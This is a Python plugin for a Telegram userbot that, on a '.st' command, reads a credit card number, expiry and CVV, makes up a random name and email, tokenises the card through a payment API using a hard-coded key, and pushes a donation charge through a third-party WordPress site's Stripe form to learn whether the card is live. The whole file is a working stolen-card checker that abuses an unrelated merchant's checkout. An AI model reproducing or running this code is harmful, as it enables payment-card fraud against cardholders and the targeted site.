import httpx
import string
import random
import time
import re

from datetime import datetime
from telethon import events
from ubb import Ubot


@Ubot.on(events.NewMessage(pattern=r'\.st'))
async def st_charge(event):
    cc = event.message.message[len('.st '):]
    reply_msg = await event.get_reply_message()
    if reply_msg:
        cc = reply_msg.message
    x = re.findall(r'\d+', cc)
    ccn = x[0]
    mm = x[1]
    yy = x[2]
    cvv = x[3]
    VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
    if not ccn.startswith(VALID):
        return await event.edit('**Invalid CC Type**')
    start = time.time()

    letters = string.ascii_lowercase
    First = ''.join(random.choice(letters) for _ in range(6))
    Last = ''.join(random.choice(letters) for _ in range(6))
    Name = f'{First}+{Last}'
    Email = f'{First}.{Last}@gmail.com'

    async with httpx.AsyncClient() as client:
        headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json"
        }
        r = await client.post('https://api.ephanti.com/v1', headers=headers)
        Muid = r.json()['muid']
        Sid = r.json()['sid']
        Guid = r.json()['guid']

        payload = {
            "guid": Guid,
            "muid": Muid,
            "sid": Sid,
            "key": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImMwY2ViYjA3LTYwZDUtNDhlNS04MTgyLWM5NzFkZGJhMWQzNCIsImFwaV9uYW1lIjoiQVBJX0d2VVVIa0Jwd2pkbFRGSXV6TyIsInBlcm1pc3Npb25zIjp7InJvbGVQZXJtaXNzaW9ucyI6WyJtZXRhZGF0YS5yZWFkIiwib3JkZXJfaXRlbXMucmVhZCIsIm9yZGVyX2l0ZW1zLndyaXRlIiwib3JkZXJfcGF5bWVudHMucmVhZCIsIm9yZGVyX3BheW1lbnRzLndyaXRlIiwicHJvZHVjdHMucmVhZCIsImFjY291bnRzLnJlYWQiLCJlbXBsb3llZXMucmVhZCIsImNhbXBhaWducy5yZWFkIiwiY2FtcGFpZ25zLndyaXRlIiwic3Vic2NyaXB0aW9ucy53cml0ZSIsInBheW1lbnRfbWV0aG9kcy5yZWFkIiwiZW1haWwucmVhZCIsImJyb2FkY2FzdHMucmVhZCIsIm9yZGVycy5yZWFkIiwib3JkZXJzLndyaXRlIiwiY29udGFjdHMucmVhZCIsInN1YnNjcmlwdGlvbnMucmVhZCJdfSwidGVuYW50X2lkIjoiY2YyN2I2MjItYzY0MC00OTBjLThlMGItNDFkOTYxMzljY2YyIiwiaWF0IjoxNzEwMzE5MzUwLCJleHAiOjE3NDE4NTUzNTB9.UrOy8rHNIK7T4c11tJDr9_nYzBk6394T-Ry4zbmBt3M",
            "card[name]": Name,
            "card[number]": ccn,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv
            }
        head = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "content-type": "application/json",
            "accept": "application/json, text/plain, */*",
            "origin": "https://app-pages.ephanti.com",
            "referer": "https://app-pages.ephanti.com/",
            "accept-language": "es,en;q=0.9"
            }

        resq = await client.post('https://api.ephanti.com/v1',
                               data=payload, headers=head)
        Id = resq.json()['id']
        Country = resq.json()['card']['country']
        Brand = resq.json()['card']['brand']

        load = {
          "action": "wp_full_stripe_payment_charge",
          "formName": "Donate",
          "fullstripe_name": Name,
          "fullstripe_email": Email,
          "fullstripe_custom_amount": 50,
          "stripeToken": Id
        }
        header = {
          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
          "content-type": "application/json",
          "accept": "application/json, text/plain, */*",
          "accept-language": "es,en;q=0.9"
        }
        cookie = {'stripe_mid': Muid, 'stripe_sid': Sid}
        req = await client.post('https://www.breslov.info/wp-admin/admin-ajax.php',
                                data=load, headers=header, cookies=cookie)
        msg = req.json()["msg"]
        end = time.time()

        if 'security code is' in req.text:
            await event.edit(
                (
                    f'✅>**STRIPE 1$**\n'
                    + f'**CC** `{ccn}|{mm}|{yy}|{cvv}`\n'
                    + f'**Msg**==> `{msg}`\n'
                    + f'**Brand**==> {Brand}\n'
                    + f'**Country**==> {Country}\n'
                    + f'**Time-Stamp** ==> {datetime.now()}\n'
                    + f'**Time-Took** ==> {end-start}\n'
                    + '**Userbot-By** ~ @Xbinner'
                )
            )

        elif "true" in req.text:
            await event.edit(
                (
                    f'✅>**STRIPE 1$**\n'
                    + f'**CC**==> `{ccn}|{mm}|{yy}|{cvv}`\n'
                    + f'**Msg**==> `{msg}`\n'
                    + f'**Brand**==> {Brand}\n'
                    + f'**Country**==> {Country}\n'
                    + f'**Time-Stamp** ==> {datetime.now()}\n'
                    + f'**Time-Took** ==> {end-start}\n'
                    + '**Userbot-By** ~ @Xbinner'
                )
            )
        else:
            await event.edit(
                (
                    f'❌>**STRIPE 1$**\n'
                    + f'**CC** `{ccn}|{mm}|{yy}|{cvv}`\n'
                    + f'**Msg**==> `{msg}`\n'
                    + f'**Brand**==> {Brand}\n'
                    + f'**Country**==> {Country}\n'
                    + f'**Time-Stamp** ==> {datetime.now()}\n'
                    + f'**Time-Took** ==> {end-start}\n'
                    + '**Userbot-By** ~ @Xbinner'
                )
            )
